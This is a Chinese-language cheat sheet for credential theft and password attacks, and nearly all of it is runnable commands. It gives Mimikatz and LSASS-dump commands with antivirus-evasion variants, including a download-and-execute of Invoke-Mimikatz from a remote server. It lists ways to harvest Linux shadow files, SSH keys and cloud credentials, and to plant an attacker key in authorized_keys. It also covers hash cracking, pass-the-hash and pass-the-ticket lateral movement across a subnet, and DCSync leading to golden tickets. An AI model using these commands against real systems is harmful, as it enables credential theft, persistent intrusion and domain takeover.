# 凭据窃取与密码攻击实战参考

> 覆盖: Windows凭据 → Linux凭据 → 内存dump → Hash破解 → 横向Pass-the-Hash → 工具速查

---

## 1. Windows 凭据窃取

### 1.1 Mimikatz 核心命令

```bash
# === 基础 (需管理员权限) ===
privilege::debug                  # 提升到debug权限
sekurlsa::logonpasswords          # ★ 核心命令 — 导出明文密码/NTLM Hash
sekurlsa::logonpasswords full     # 完整输出

# === 从 LSASS 进程 dump ===
lsadump::lsa /patch               # LSA secrets
lsadump::sam                      # SAM 数据库
lsadump::secrets                  # 缓存的凭据
lsadump::cache                    # 域缓存凭据

# === Kerberos 相关 ===
kerberos::list                    # 列出 Kerberos tickets
kerberos::ptt ticket.kirbi        # Pass-the-Ticket

# === 导出票据 ===
sekurlsa::tickets /export

# === Token 操作 ===
token::elevate                    # 令牌提升
token::list                       # 列出令牌
token::whoami                     # 当前令牌信息

# === 杂项 ===
vault::cred /patch                # Windows Credential Vault
dpapi::masterkey /in:key_file     # DPAPI 主密钥
crypto::certificates /systemstore:LOCAL_MACHINE store   # 证书
```

### 1.2 免杀执行 Mimikatz

```powershell
# 方式1: Invoke-Mimikatz (PowerShell, 可能被AMSI拦)
IEX (New-Object Net.WebClient).DownloadString('http://server/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# 方式2: 内存加载 (反射注入, 绕过杀软)
# 使用 C# 加载器或 PE Loader 内存执行 mimikatz.exe

# 方式3: procdump + mimikatz offline (相对隐蔽)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 拿到 lsass.dmp 回本地:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

# 方式4: 自定义实现
# - sekurlsa (C# 版 mimikatz)
# - pypykatz (Python 版, 纯内存)
pypykatz lsa minidump lsass.dmp
```

### 1.3 其他 Windows 凭据位置

```powershell
# === SAM 数据库 ===
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# 回本地:
samdump2 system.hive sam.hive          # Linux
secretsdump.py -sam sam.hive -system system.hive LOCAL

# === 浏览器保存的密码 ===
# Chrome/Edge:
type "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
# 用工具: SharpChrome.exe / LaZagne.exe

# === 保存的 RDP 凭据 ===
cmdkey /list
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\

# === PowerShell 历史 ===
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# === Sysprep / Unattend (自动部署文件) ===
findstr /si password C:\Windows\Panther\Unattend.xml
findstr /si password C:\Windows\Panther\Unattend\Unattend.xml
findstr /si password C:\Windows\system32\sysprep.inf
findstr /si password C:\Windows\system32\sysprep\sysprep.xml

# === GPP 组策略密码 (Groups.xml) ===
findstr /si password C:\ProgramData\Microsoft\Group Policy\History\*
# 使用 gpp-decrypt 解密 cpassword

# === PowerShell 脚本中硬编码 ===
findstr /si password *.ps1 *.xml *.txt *.config *.ini

# === 注册表中的密码 ===
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## 2. Linux 凭据窃取

### 2.1 基础

```bash
# === Shadow 文件 ===
cat /etc/shadow 2>/dev/null
# 配合 /etc/passwd → unshadow → john/hashcat

# === 历史文件 ===
cat ~/.*history 2>/dev/null
cat /home/*/.*history 2>/dev/null
cat /root/.*history 2>/dev/null

# === SSH 密钥 ===
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/id_ed25519 2>/dev/null
cat /home/*/.ssh/id_* 2>/dev/null
ls -la ~/.ssh/

# authorized_keys (如果可写 → 追加自己的公钥)
cat ~/.ssh/authorized_keys
echo "ssh-rsa AAAA...your-key" >> ~/.ssh/authorized_keys

# known_hosts (发现横向移动目标)
cat ~/.ssh/known_hosts

# === 配置文件中的密码 ===
grep -rn "password" /etc/ 2>/dev/null | grep -v "^#"
grep -rn "PASSWORD" /var/www/ 2>/dev/null
grep -rn "DB_PASS" /var/www/ 2>/dev/null
grep -rn "secret" /etc/ 2>/dev/null

# 常见凭据文件:
cat /etc/fstab                     # 远程挂载凭据
cat /etc/knockd.conf               # Port Knocking 序列
cat ~/.git-credentials             # Git 凭据
cat ~/.docker/config.json          # Docker Registry 凭据
cat ~/.aws/credentials             # AWS 密钥
cat ~/.azure/accessTokens.json     # Azure token
cat ~/.config/gcloud/credentials.db # GCP 凭据
```

### 2.2 内存中找密码

```bash
# 从 /proc/ 环境变量读
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -E "(PASS|SECRET|KEY|TOKEN)"

# 从进程命令行参数读 (MySQL 密码常见: mysql -u root -pPASSWORD)
ps aux | grep -E "(mysql|psql|redis-cli)" | grep -v grep

# 全局环境变量 (可能是明文密码)
env
cat /etc/environment
```

---

## 3. Hash 破解

### 3.1 Hash 识别

```bash
# 按长度和前缀判断:
# NTLM:   32位十六进制  →  aad3b435b51404eeaad3b435b51404ee
# LM:     32位十六进制 (两段)  
# NetNTLMv1/v2: 含:和::
# SHA256crypt ($5$):  $5$rounds=5000$...
# SHA512crypt ($6$):  $6$rounds=5000$...
# MD5crypt ($1$):     $1$...

# hashid 工具
hashid <hash_string>
hashid -m <hash_string>   # → 输出 john/hashcat 的 mode 编号
```

### 3.2 Hashcat

```bash
# === 基础 ===
hashcat -m <mode> -a 0 hash.txt wordlist.txt

# === Windows NTLM ===
hashcat -m 1000 ntlm_hashes.txt rockyou.txt                # NTLM
hashcat -m 5600 netntlmv2.txt rockyou.txt                  # NetNTLMv2

# === Linux ===
hashcat -m 1800 shadow_hash.txt rockyou.txt                # SHA-512 crypt ($6$)

# === 常用参数 ===
hashcat -m 1000 -a 0 --force --show hash.txt               # 显示已破解的
hashcat -m 1000 -a 0 --status --status-timer=10 hash.txt rockyou.txt  # 实时状态
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?d?d?d?d            # 掩码攻击 (8位小写+数字)
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d           # 字典+掩码(末尾3数字)
hashcat -m 1000 -a 0 -r best64.rule hash.txt rockyou.txt   # 带规则

# === 攻击模式 ===
# -a 0 (Straight)    字典攻击
# -a 1 (Combination) 两个字典组合
# -a 3 (Brute-force) 掩码暴力
# -a 6 (Hybrid)      字典+掩码
# -a 7 (Hybrid)      掩码+字典
```

### 3.3 John the Ripper

```bash
# 准备 (unshadow)
unshadow /etc/passwd /etc/shadow > hashes.txt

# 字典攻击
john --wordlist=rockyou.txt hashes.txt

# 显示结果
john --show hashes.txt

# 增量模式 (暴力)
john --incremental hashes.txt

# 指定格式
john --format=NT --wordlist=rockyou.txt ntlm_hashes.txt
john --format=sha512crypt --wordlist=rockyou.txt shadow.txt
```

---

## 4. 横向移动技术

### 4.1 Pass-the-Hash (PTH)

```bash
# === 前提: 拿到 NTLM Hash, 目标有 admin 权限 (RID=500或本地管理员组) ===

# crackmapexec (推荐 — 先测试连通性)
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth
# 成功 → (Pwn3d!) 显示在输出中

# Impacket psexec
psexec.py Administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket wmiexec (更隐蔽)
wmiexec.py Administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket smbexec
smbexec.py Administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket atexec (计划任务, 无交互)
atexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10 "whoami"

# evil-winrm (需 WinRM 开启)
evil-winrm -i 192.168.1.10 -u Administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'

# Mimikatz
sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

### 4.2 Pass-the-Ticket (PTT)

```bash
# === 导出 Kerberos Tickets ===
mimikatz sekurlsa::tickets /export

# === 导入 Ticket ===
mimikatz kerberos::ptt ticket.kirbi

# === 使用 Rubeus ===
Rubeus.exe dump                    # 导出当前 tickets
Rubeus.exe ptt /ticket:ticket.kirbi # 导入

# === 检查 ===
klist                              # 列出 Kerberos tickets
```

### 4.3 Overpass-the-Hash (Pass-the-Key)

```bash
# === 用 NTLM Hash 请求 TGT (AS-REQ) ===

# Rubeus
Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /domain:domain.com /ptt

# Impacket getTGT
getTGT.py domain.com/Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass Administrator@DC.domain.com

# Mimikatz
sekurlsa::ekeys                  # 导出 Kerberos keys
```

---

## 5. DCSync (域控同步攻击)

```bash
# === DCSync — 从 DC 同步域内任意用户 Hash (需域管/DCSync权限) ===

# Mimikatz
mimikatz lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz lsadump::dcsync /domain:domain.com /all

# Impacket secretsdump
secretsdump.py domain.com/Administrator:Pass@DC.domain.com
secretsdump.py domain.com/Administrator@DC.domain.com -hashes :hash

# → 拿到 krbtgt hash → 制作 Golden Ticket
# → 拿到全部用户 hash → PTH 横向
```

---

## 6. 快速参考

### 6.1 凭据收集优先级

```
1. 明文密码 (logonpasswords / 配置文件 / 历史记录)
2. NTLM Hash (SAM / LSASS / NTDS.dit)
3. Kerberos Tickets (当前/缓存的)
4. SSH 私钥
5. 浏览器/应用保存的密码
6. 环境变量中的密钥
7. DPAPI 加密的凭据
```

### 6.2 工具速查

| 工具 | 平台 | 用途 |
|------|------|------|
| Mimikatz | Windows | 全功能凭据窃取 |
| pypykatz | Linux | 纯Python版mimikatz |
| secretsdump.py | Linux | SAM/LSA/NTDS dump |
| crackmapexec | Linux | 批量PTH/密码喷洒 |
| Rubeus | Windows | Kerberos攻击 |
| SharpHound | Windows | BloodHound数据收集 |
| LaZagne | Win/Linux | 全平台密码提取 |
| Hashcat | Linux | GPU Hash破解 |
| John | Linux | CPU Hash破解 |

---

*参考: Mimikatz + Impacket + HackTricks + 实战案例*
